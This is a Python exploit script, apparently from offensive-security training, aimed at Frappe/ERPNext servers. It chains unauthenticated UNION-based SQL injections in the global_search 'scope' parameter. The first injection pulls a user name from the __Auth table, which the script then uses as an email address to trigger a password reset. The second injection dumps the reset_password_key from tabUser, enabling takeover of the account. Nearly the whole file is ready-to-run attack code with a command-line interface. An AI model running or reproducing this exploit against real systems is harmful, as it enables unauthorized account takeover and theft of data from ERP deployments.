import requests
import argparse
import re
import json

def getEmail(url):
    """
    Send a request to the given URL and extract an email address from the response.
    
    Args:
        url (str): The URL to send the request to
        text (str): Text parameter for the request
        scope (str): Scope parameter for the request
        
    Returns:
        str: Extracted email address or error message
    """

    # Injection parameters
    text='offsec'
    scope='offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#'

    # Set up the cookies, headers, and data for the request
    cookies = {
        "full_name": "Guest",
        "user_id": "Guest",
        "system_user": "yes",
        "sid": "Guest",
        "user_image": ""
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Frappe-CSRF-Token": "None",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Origin": url.rstrip('/'),
        "Referer": url,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }
    
    data = {
        "cmd": "frappe.utils.global_search.web_search",
        "text": text,
        "scope": scope
    }
    
    # Send the request
    try:
        res = requests.post(url, headers=headers, cookies=cookies, data=data)
        res.raise_for_status()  # Raise an exception for HTTP errors
        
        # Extract email from the response
        return extract_email(res.text)
        
    except requests.exceptions.RequestException as e:
        return f"Error sending request: {e}"

def extract_email(response_text):
    """
    Extract email address from the response text.
    
    Args:
        response_text (str): The response text to search for emails
        
    Returns:
        str: First found email or message indicating no email was found
    """
    try:
        # Try to parse as JSON first
        response_json = json.loads(response_text)
        # Search for email in the JSON response
        text_to_search = str(response_json)
    except json.JSONDecodeError:
        # If it's not JSON, search the raw text
        text_to_search = response_text
    
    # Regular expression to find email addresses
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    emails = re.findall(email_pattern, text_to_search)
    
    return emails[0] if emails else "No email found"

def resetPassword(url, email):
    """
    Send a password reset request for the specified email.
    
    Args:
        email (str): The email address to reset the password for
        url (str, optional): The URL of the server. Defaults to "http://erpnext:8000/".
        
    Returns:
        requests.Response: The response object from the request
    """
    import requests
    
    cookies = {
        "sid": "Guest", 
        "system_user": "yes", 
        "user_image": "", 
        "user_id": "Guest", 
        "full_name": "Guest"
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "X-Frappe-CSRF-Token": "None", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", 
        "Origin": url.rstrip('/'), 
        "Referer": url, 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "keep-alive"
    }
    
    data = {
        "cmd": "frappe.core.doctype.user.user.reset_password", 
        "user": email
    }
    
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    return response

def extractToken(url):
    """
    Extract token and email information from the specified URL.
    
    Args:
        url (str): The URL to send the request to. Defaults to "http://erpnext:8000/".
        
    Returns:
        dict: A dictionary containing 'email' and 'route' information if found
    """
    cookies = {
        "full_name": "Guest", 
        "user_id": "Guest", 
        "system_user": "yes", 
        "sid": "Guest", 
        "user_image": ""
    }
    
    headers = {
        "X-Requested-With": "XMLHttpRequest", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "X-Frappe-CSRF-Token": "None", 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", 
        "Origin": url.rstrip('/'), 
        "Referer": url, 
        "Accept-Encoding": "gzip, deflate, br", 
        "Connection": "keep-alive"
    }
    
    data = {
        "cmd": "frappe.utils.global_search.web_search", 
        "text": "offsec", 
        "scope": 'offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#'
    }
    
    # Send the request
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    
    result = {
        "email": None,
        "route": None
    }
    
    
    response_data = json.loads(response.text)
    return response_data["message"][2]["route"]
    
def main():
    """
    Main function to parse command-line arguments and call the getEmail function.
    """
    # Set up argument parser
    parser = argparse.ArgumentParser(description='Send a request to an endpoint and extract email from response.')
    parser.add_argument('--url', help='The URL to send the request to')
    
    args = parser.parse_args()
    url = args.url
    
    # Call getEmail with the provided arguments
    email = getEmail(url)
    print(f"[+] Found email: {email}")

    # Reset password
    res = resetPassword(url, email)
    if res.status_code == 200:
        print("[+] Password reset initialized")

    # Get reset token
    token = extractToken(url)
    print(f"[+] Password reset token: {token}")

if __name__ == "__main__":
    main()